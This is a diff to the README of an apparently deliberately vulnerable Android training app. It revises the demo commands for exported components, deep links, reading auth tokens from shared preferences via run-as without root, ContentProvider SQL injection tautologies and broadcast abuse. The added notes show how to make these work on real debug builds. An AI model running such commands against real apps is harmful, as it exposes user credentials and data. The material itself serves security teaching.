@@ -41,8 +41,8 @@ use with real credentials. For educational/demo purposes ONLY.
 | 1 | Exported Components | 🔴 CRITICAL | `adb shell am start -n com.hackdroid.demo/.vulns.AdminActivity` |
 | 2 | Deep Links | 🟠 HIGH | `adb shell am start -a VIEW -d "hackdroid://transfer?amount=9999&to=attacker"` |
 | 3 | WebViews / JS Bridge | 🟠 HIGH | Load `webview_demo.html` in the WebView demo |
-| 4 | Insecure Storage | 🟡 MEDIUM | `adb pull /data/data/com.hackdroid.demo/shared_prefs/` |
-| 5 | SQL Injection | 🟡 MEDIUM | `adb shell content query --uri content://com.hackdroid.demo.provider/users --where "name='x' OR '1'='1'"` |
+| 4 | Insecure Storage | 🟡 MEDIUM | `adb shell run-as com.hackdroid.demo cat /data/data/com.hackdroid.demo/shared_prefs/auth_prefs.xml` |
+| 5 | SQL Injection | 🟡 MEDIUM | `adb shell content query --uri content://com.hackdroid.demo.provider/users --where "1=1"` |
 | 6 | Reverse Engineering | ⚪ LOW | `jadx -d out/ app.apk` |
 | 7 | Broadcast Receivers | ⚪ LOW | `adb shell am broadcast -a com.hackdroid.RESET_AUTH` |
 
@@ -96,21 +96,37 @@ adb shell am start -a android.intent.action.VIEW \
 ### Demo 3 — Read Insecure Storage
 
 ```bash
-adb pull /data/data/com.hackdroid.demo/shared_prefs/auth_prefs.xml
-cat auth_prefs.xml
+# No root required — works on any debug APK
+adb shell run-as com.hackdroid.demo \
+  cat /data/data/com.hackdroid.demo/shared_prefs/auth_prefs.xml
+
+# Alternative: copy to sdcard, then pull
+adb shell run-as com.hackdroid.demo \
+  cp /data/data/com.hackdroid.demo/shared_prefs/auth_prefs.xml /sdcard/auth_prefs.xml
+adb pull /sdcard/auth_prefs.xml && cat auth_prefs.xml
 ```
 
 **Expected:** Auth token, email, and session ID visible in plain XML.
 
+> **Why `run-as` instead of `adb pull`?** Direct `adb pull` of `/data/data/` requires root. `run-as` works on any debug build without root — making this a real-world attack, not just a rooted-device demo.
+
 ### Demo 4 — SQL Injection via ContentProvider
 
 ```bash
+# Simplest — no shell-quoting issues
 adb shell content query \
   --uri content://com.hackdroid.demo.provider/users \
-  --where "name='x' OR '1'='1'"
+  --where "1=1"
+
+# Classic tautology payload (inner double-quotes must be escaped for the remote shell)
+adb shell content query \
+  --uri content://com.hackdroid.demo.provider/users \
+  --where "\"name='x' OR '1'='1'\""
 ```
 
 **Expected:** All user rows returned including plaintext tokens.
+
+> **Shell quoting note:** `adb shell` passes arguments to the device shell, so `--where` values containing spaces and single quotes need an extra layer of quoting. `1=1` is the easiest demo payload — still a valid SQL injection tautology.
 
 ### Demo 5 — Exported Broadcast Receiver
 
